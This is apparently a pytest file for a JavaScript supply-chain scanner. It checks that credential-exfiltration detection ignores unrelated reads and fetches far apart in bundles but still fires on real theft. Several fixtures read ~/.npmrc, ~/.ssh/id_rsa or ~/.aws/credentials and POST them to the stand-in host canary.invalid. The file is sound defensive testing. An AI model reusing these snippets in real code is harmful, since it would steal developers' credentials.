"""False-positive plan step 2: in bundled or minified files, exfil.combo needs the credential read and the network
call close together (bundle.py, proximity.py), not merely in the same file. Unbundled source keeps the
same-function rule; real exfiltration written as one function inside a bundle still fires.

Every fixture is inert and canary-only: the hosts are reserved (.invalid / .example) and nothing is run.
"""
from __future__ import annotations

import pytest

from bawwab.scan.files import ScanFile
from bawwab.scan.rules import bundle, code, parsing, proximity, run_static_rules
from bawwab.types import Severity

ESBUILD_HEAD = """#!/usr/bin/env node
"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __commonJS = (cb, mod) => function __require() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __toESM = (mod) => mod;
"""


def _filler(i: int) -> str:
    return (
        f'// node_modules/lib{i}/index.js\n'
        f'var require_lib{i} = __commonJS({{\n'
        f'  "node_modules/lib{i}/index.js"(exports, module) {{\n'
        f'    function add{i}(a, b) {{ return a + b * {i}; }}\n'
        f'    function mul{i}(a, b) {{ var r = 0; for (var j = 0; j < b; j++) {{ r = add{i}(r, a); }} return r; }}\n'
        f'    module.exports = {{ add{i}, mul{i} }};\n'
        f'  }}\n'
        f'}});\n'
    )


def fillers(a: int, b: int) -> str:
    return "".join(_filler(i) for i in range(a, b))


# The `debug` package's pattern (most bundled false alarms): a copy of the environment for its options...
DEBUG_MODULE = """// node_modules/debug/src/node.js
var require_node = __commonJS({
  "node_modules/debug/src/node.js"(exports, module) {
    exports.inspectOpts = Object.keys(process.env).filter((key) => {
      return /^debug_/i.test(key);
    }).reduce((obj, key) => { obj[key] = process.env[key]; return obj; }, {});
  }
});
"""
# ... a credential path named in help text of one module ...
HELP_MODULE = """// node_modules/helptext/index.js
var require_helptext = __commonJS({
  "node_modules/helptext/index.js"(exports, module) {
    module.exports = { hint: "Put your key in ~/.ssh/id_rsa or ~/.npmrc and restart." };
  }
});
"""
# ... and, far away, an unrelated HTTP client.
FETCH_MODULE = """// node_modules/client/index.js
var require_client = __commonJS({
  "node_modules/client/index.js"(exports, module) {
    async function getJson(url) { const r = await fetch(url); return r.json(); }
    module.exports = { getJson };
  }
});
"""
STEAL_MODULE = """// src/telemetry.js
var require_telemetry = __commonJS({
  "src/telemetry.js"(exports, module) {
    var fs = require("fs"), os = require("os");
    async function report() {
      const k = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
      await fetch("https://canary.invalid/collect", { method: "POST", body: k });
    }
    module.exports = { report };
  }
});
"""


def scan(rel: str, text: str):
    return run_static_rules([ScanFile(rel, text)])


def combos(findings, file: str | None = None):
    return [x for x in findings if x.rule == "exfil.combo" and (file is None or x.file == file)]


def counted(findings):
    return [x for x in findings if x.severity >= Severity.MED]


def big_bundle(*modules: str) -> str:
    """An esbuild-style bundle: the given modules separated by ~40 KB of unrelated library code each."""
    parts, n = [ESBUILD_HEAD], 0
    for m in modules:
        parts.append(fillers(n, n + 120))
        parts.append(m)
        n += 120
    parts.append(fillers(n, n + 120))
    return "".join(parts)


# ---------------------------------------------------------------- detection


def test_detect_esbuild_runtime():
    assert bundle.why("dist/index.js", big_bundle()) == "runtime"


def test_detect_module_comments_without_runtime():
    text = big_bundle(HELP_MODULE).replace("__commonJS", "__cjs").replace("__defProp", "__dp")
    assert bundle.why("server.mjs", text) == "modules"


def test_detect_webpack_runtime():
    text = "(()=>{var __webpack_modules__={};function __webpack_require__(id){return __webpack_modules__[id]}\n" + \
        "\n".join(f"function f{i}(a){{return a+{i}}}" for i in range(6000)) + "})();"
    assert bundle.why("main.js", text) == "runtime"


def test_detect_minified_one_liner():
    text = ";".join(f"function f{i}(a,b){{return a+b*{i}}}" for i in range(4000))
    assert len(text) > bundle.BUNDLE_MIN_BYTES and "\n" not in text
    assert bundle.why("lib/index.js", text) == "minified"


def test_not_a_bundle_hand_written_source():
    text = "\n".join(f"function f{i}(a, b) {{\n  return a + b * {i};\n}}\n" for i in range(4000))
    assert len(text) > bundle.BUNDLE_MIN_BYTES
    assert bundle.why("dist/server.js", text) is None  # the path is a hint only


def test_not_a_bundle_long_string_line():
    # one huge prompt / data literal in hand-written source is not minified code
    text = "const PROMPT = `" + ("Use the tool to read the file and report back. " * 3000) + "`;\nexport default PROMPT;\n"
    assert bundle.why("src/prompt.js", text) is None


def test_not_a_bundle_small_minified():
    text = ";".join(f"function f{i}(a){{return a+{i}}}" for i in range(400))
    assert len(text) < bundle.HINT_MIN_BYTES
    assert bundle.why("dist/x.min.js", text) is None


def test_path_hint_lowers_the_floor_only():
    text = ";".join(f"function f{i}(a){{return a+{i}}}" for i in range(1100))
    assert bundle.HINT_MIN_BYTES < len(text) < bundle.BUNDLE_MIN_BYTES
    assert bundle.why("dist/x.min.js", text) == "minified"
    assert bundle.why("src/x.js", text) is None


def test_python_is_never_a_bundle():
    text = ";".join(f"x{i}=lambda a:a+{i}" for i in range(6000))
    assert bundle.why("pkg/big.py", text) is None


# ---------------------------------------------------------------- false alarms removed


def test_bundle_debug_env_copy_and_far_fetch_is_no_combo():
    text = big_bundle(DEBUG_MODULE, FETCH_MODULE)
    assert bundle.is_bundle("dist/index.js", text)
    found = scan("dist/index.js", text)
    assert not combos(found), combos(found)
    assert not counted(found), counted(found)


def test_bundle_cred_help_text_and_far_fetch_is_no_combo():
    text = big_bundle(HELP_MODULE, FETCH_MODULE)
    found = scan("dist/index.js", text)
    assert not combos(found), combos(found)
    # the single credential signal is not this step's business: unchanged
    assert any(x.rule == "credential-access" and x.severity == Severity.HIGH for x in found)


def test_minified_one_liner_far_apart_is_no_combo():
    lib = ";".join(f"function f{i}(a,b){{return a+b*{i}}}" for i in range(1500))
    text = ("var opts=Object.keys(process.env).filter(function(k){return/^debug_/i.test(k)});" + lib +
            ";async function g(u){var r=await fetch(u);return r.json()}" + lib.replace("function f", "function h"))
    assert bundle.why("dist/index.js", text) == "minified"
    assert not combos(scan("dist/index.js", text))


# ---------------------------------------------------------------- real exfiltration still fires


def test_bundle_one_function_exfil_fires_critical():
    text = big_bundle(DEBUG_MODULE, STEAL_MODULE, FETCH_MODULE)
    found = combos(scan("dist/index.js", text))
    assert any(x.severity == Severity.CRITICAL for x in found), found


def test_minified_one_function_exfil_fires_critical():
    lib = ";".join(f"function f{i}(a,b){{return a+b*{i}}}" for i in range(2000))
    steal = ('var fs=require("fs"),os=require("os");async function r(){const k=fs.readFileSync(os.homedir()+'
             '"/.ssh/id_rsa","utf8");await fetch("https://canary.invalid/c",{method:"POST",body:k})}')
    text = lib + ";" + steal + ";" + lib.replace("function f", "function h")
    assert bundle.why("dist/app.min.js", text) == "minified"
    found = combos(scan("dist/app.min.js", text))
    assert any(x.severity == Severity.CRITICAL for x in found), found


def test_bundle_flow_through_a_named_reader_fires():
    # the credential is read in one function and sent from another that calls it by name
    reader = """// src/a.js
var require_a = __commonJS({
  "src/a.js"(exports, module) {
    var fs = require("fs"), os = require("os");
    function readDeployToken() { return fs.readFileSync(os.homedir() + "/.npmrc", "utf8"); }
    module.exports = { readDeployToken };
  }
});
"""
    sender = """// src/b.js
var require_b = __commonJS({
  "src/b.js"(exports, module) {
    async function sync() {
      await fetch("https://canary.invalid/s", { method: "POST", body: require_a().readDeployToken() });
    }
    module.exports = { sync };
  }
});
"""
    text = big_bundle(reader, sender)
    assert combos(scan("dist/index.js", text))


def test_bundle_credential_handed_to_a_sending_wrapper_fires():
    wrapper = """// src/net.js
var require_net = __commonJS({
  "src/net.js"(exports, module) {
    async function postBeacon(url, data) { return fetch(url, { method: "POST", body: data }); }
    module.exports = { postBeacon };
  }
});
"""
    caller = """// src/main.js
var require_main = __commonJS({
  "src/main.js"(exports, module) {
    var fs = require("fs"), os = require("os");
    var { postBeacon } = require_net();
    function start() { postBeacon("https://canary.invalid/b", fs.readFileSync(os.homedir() + "/.ssh/id_rsa")); }
    module.exports = { start };
  }
});
"""
    text = big_bundle(wrapper, caller)
    assert combos(scan("dist/index.js", text))


def test_bundle_esbuild_https_holder_in_the_same_function_keeps_the_floor():
    # esbuild binds node's https through __toESM(require("https")); the call on it is not a recognised network
    # call, so the backstop (network reference near the credential) keeps the combo counted.
    mod = """// src/up.js
var import_https = __toESM(require("https"));
var require_up = __commonJS({
  "src/up.js"(exports, module) {
    var fs = require("fs"), os = require("os");
    function upload() {
      const body = fs.readFileSync(os.homedir() + "/.aws/credentials");
      const req = import_https.default.request({ host: "canary.invalid", method: "POST" });
      req.end(body);
    }
    module.exports = { upload };
  }
});
"""
    text = big_bundle(mod)
    found = combos(scan("dist/index.js", text))
    assert any(x.severity >= Severity.MED for x in found), found


def test_bundle_webpack_external_https_in_the_same_function_keeps_the_floor():
    lib = ";".join(f"function f{i}(a,b){{return a+b*{i}}}" for i in range(2000))
    text = ('(()=>{var __webpack_modules__={65692:t=>{"use strict";t.exports=require("https")},'
            '7:(e,t,n)=>{const fs=n(896),os=n(857),h=n(65692);'
            'function up(){const b=fs.readFileSync(os.homedir()+"/.ssh/id_rsa");h.request({host:"canary.invalid"}).end(b)}'
            'e.exports={up}}};' + lib + '})();')
    assert bundle.is_bundle("dist/index.js", text)
    found = combos(scan("dist/index.js", text))
    assert any(x.severity >= Severity.MED for x in found), found


# ---------------------------------------------------------------- unbundled source keeps today's rule


def test_unbundled_far_apart_still_fires():
    # the same far-apart layout in ordinary source: the same-file backstop still applies
    text = 'const fs = require("fs"), os = require("os");\n' \
        'function a() { return fs.readFileSync(os.homedir() + "/.ssh/id_rsa"); }\n' + \
        "\n".join(f"function pad{i}(x) {{ return x + {i}; }}" for i in range(200)) + \
        '\nasync function b(u) { return fetch(u); }\n'
    assert not bundle.is_bundle("src/index.js", text)
    assert combos(scan("src/index.js", text))


def test_unparseable_bundle_fails_closed(monkeypatch):
    text = big_bundle(HELP_MODULE, FETCH_MODULE)
    code.clear_caches()

    def refuse(src, lang):
        raise ValueError("refused")

    monkeypatch.setattr(proximity.parsing, "js_root", refuse)
    assert proximity.near("dist/index.js", text, [10], [20]) is None
    monkeypatch.undo()
    # with proximity unavailable, the combo falls back to today's same-file rule
    monkeypatch.setattr(proximity, "near", lambda *a, **k: None)
    code.clear_caches()
    assert combos(scan("dist/index.js", text))
    code.clear_caches()


# ---------------------------------------------------------------- proximity unit tests


def _pos(text: str, needle: str) -> int:
    return text.encode().index(needle.encode())


def test_near_same_small_function():
    t = "function a(){var k=readFileSync('/x/.npmrc');" + "x();" * 2000 + "fetch(u,{body:k})}"
    assert proximity.near("a.js", t, [_pos(t, ".npmrc")], [_pos(t, "fetch(")])


def test_near_not_across_a_huge_function():
    body = "x();" * (proximity.SCOPE_MAX_BYTES // 2)
    t = "function a(){var q=readFileSync('/x/.npmrc');" + body + "fetch(u)}"
    assert proximity.near("a.js", t, [_pos(t, ".npmrc")], [_pos(t, "fetch(")]) is False


def test_near_window_at_top_level():
    t = "var q=readFileSync('/x/.npmrc');\nfetch(u,{body:q});\n"
    assert proximity.near("a.js", t, [_pos(t, ".npmrc")], [_pos(t, "fetch(")])


def test_near_common_minified_name_does_not_link():
    pad = ";".join(f"function p{i}(e){{return e+{i}}}" for i in range(1500))
    t = "var e=readFileSync('/x/.npmrc');" + pad + ";function z(){fetch(u,{body:e})}"
    # `e` is used everywhere: no flow through it
    assert proximity.near("a.js", t, [_pos(t, ".npmrc")], [_pos(t, "fetch(")]) is False


def test_near_multibyte_offsets():
    t = "var s='ééé';function a(){var k=readFileSync('/x/.npmrc');fetch(u,{body:k})}"
    chars = [t.index(".npmrc")]
    assert proximity.char_to_byte(t, chars) == [_pos(t, ".npmrc")]


def test_parsing_refusal_is_none(monkeypatch):
    monkeypatch.setattr(parsing, "js_root", lambda *a: (_ for _ in ()).throw(ValueError("x")))
    assert proximity.near("a.js", "fetch(u)", [0], [1]) is None


@pytest.fixture(autouse=True)
def _fresh_caches():
    code.clear_caches()
    yield
    code.clear_caches()
